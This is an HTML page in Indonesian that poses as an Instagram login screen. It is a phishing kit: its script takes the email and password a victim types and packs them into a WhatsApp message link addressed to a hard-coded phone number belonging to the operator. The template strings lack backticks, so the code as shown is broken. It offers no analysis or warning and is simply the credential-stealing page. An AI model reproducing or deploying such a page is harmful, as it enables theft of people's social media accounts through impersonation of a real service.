<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Login Instagram</title>
  <link rel="stylesheet" href="style.css" />
</head>
<body>
  <div class="login-container">
    <div class="login-box">
      <h1 class="logo">Instagram</h1>
      <form id="loginForm">
        <input type="email" id="email" placeholder="Email" required />
        <input type="password" id="password" placeholder="Password" required />
        <button type="submit">Login</button>
      </form>
      <p class="signup">Belum punya akun? <a href="#">Daftar</a></p>
    </div>
  </div>

  <script>
    document.getElementById("loginForm").addEventListener("submit", function(event) {
      event.preventDefault();
      var email = document.getElementById("email").value;
      var password = document.getElementById("password").value;

      // Nomor WhatsApp Anda (kode negara tanpa + atau 0 di depan)
      var nomorWhatsApp = "62856038910564";

      var pesan = Login Instagram\nEmail: ${email}\nPassword: ${password};
      var url = https://api.whatsapp.com/send?phone=${nomorWhatsApp}&text=${encodeURIComponent(pesan)};
      
      window.open(url, "_blank");
    });
  </script>
</body>
</html>
